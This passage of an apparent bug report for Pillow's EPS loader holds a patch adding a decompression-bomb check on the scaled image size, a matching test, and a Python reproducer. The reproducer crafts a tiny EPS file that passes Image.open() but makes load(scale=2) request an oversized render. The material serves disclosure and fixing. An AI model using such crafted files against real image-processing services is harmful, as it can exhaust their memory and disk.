`scale=1` the check re-emits the `DecompressionBombWarning` that `Image.open()` already issued for sizes between 1× and 2× the limit; guarding the call with `if scale > 1:` would avoid the duplicate. The patch also adds `test_load_scale_decompression_bomb` to `Tests/test_file_eps.py`, in the style of the WMF test: it sets `MAX_IMAGE_PIXELS` to `im.width * im.height` and expects `im.load(scale=2)` to raise `DecompressionBombError`. Like the rest of that file it is skipped without Ghostscript, because `has_ghostscript()` is consulted at the top of `Ghostscript()`; moving the check above that call would let the test run without it. ## The patch Add decompression bomb check on the scaled size in EpsImagePlugin.Ghostscript() before Ghostscript is invoked Applies to `src/PIL/EpsImagePlugin.py` at the commit above. ```diff diff --git a/Tests/test_file_eps.py b/Tests/test_file_eps.py index 70eced62a..de331d97f 100644 --- a/Tests/test_file_eps.py +++ b/Tests/test_file_eps.py @@ -98,6 +98,14 @@ def test_sanity(filename: str, size: tuple[int, int], scale: int) -> None: assert image.format == "EPS" +@pytest.mark.skipif(not HAS_GHOSTSCRIPT, reason="Ghostscript not available") +def test_load_scale_decompression_bomb(monkeypatch: pytest.MonkeyPatch) -> None: + with Image.open(FILE1) as im: + monkeypatch.setattr(Image, "MAX_IMAGE_PIXELS", im.width * im.height) + with pytest.raises(Image.DecompressionBombError): + im.load(scale=2) + + @pytest.mark.skipif(not HAS_GHOSTSCRIPT, reason="Ghostscript not available") def test_load() -> None: with Image.open(FILE1) as im: diff --git a/src/PIL/EpsImagePlugin.py b/src/PIL/EpsImagePlugin.py index 5eaefe339..ccc6f1d85 100644 --- a/src/PIL/EpsImagePlugin.py +++ b/src/PIL/EpsImagePlugin.py @@ -92,6 +92,7 @@ def Ghostscript( scale = int(scale) or 1 width = size[0] * scale height = size[1] * scale + Image._decompression_bomb_check((width, height)) # resolution is dependent on bbox and size res_x = 72.0 * width / (bbox[2] - bbox[0]) res_y = 72.0 * height / (bbox[3] - bbox[1]) ``` ## The reproducer
Reproducer — repro, 1,845 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # EpsImagePlugin.Ghostscript(): load(scale=N) hands gs a -g geometry of # (W*N)x(H*N) with no _decompression_bomb_check on the scaled size; only the # unscaled WxH was checked by Image.open(). gs is not installed here, so we # set gs_binary and intercept subprocess.check_call to read the argv Pillow builds. import os, subprocess, tempfile, warnings from PIL import Image, EpsImagePlugin EpsImagePlugin.gs_binary = "gs" # skip the `gs --version` probe path = os.path.join(tempfile.mkdtemp(), "a.eps") with open(path, "w") as f: # 9000x9000 = 81 Mpx < MAX_IMAGE_PIXELS (89.5 Mpx) f.write("%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 9000 9000\n%%EndComments\nshowpage\n") calls = [] def fake_check_call(cmd, **kw): calls.append(cmd) raise OSError("gs intercepted") # stop here; we only need the argv subprocess.check_call = fake_check_call hard = 2 * Image.MAX_IMAGE_PIXELS bomb_before_gs = False with warnings.catch_warnings(): warnings.simplefilter("error", Image.DecompressionBombWarning) try: with Image.open(path) as im: print("Image.open accepted", os.path.getsize(path), "byte EPS, size", im.size) im.load(scale=2) except (Image.DecompressionBombError, Image.DecompressionBombWarning) as e: bomb_before_gs = not calls print("bomb check fired", "before" if bomb_before_gs else "after", "gs:", e) except OSError as e: print("load() reached gs:", e) over = False for c in calls: g = next(a for a in c if a.startswith("-g"))[2:] w, h = map(int, g.split("x")) over |= w * h > hard print(f"gs argv geometry -g{g} = {w*h} px ({w*h/Image.MAX_IMAGE_PIXELS:.1f}x MAX_IMAGE_PIXELS, " f"hard limit {hard}); pnmraw output would be {w*h*3} bytes") print("BUG" if calls and over and not bomb_before_gs else "OK") ```
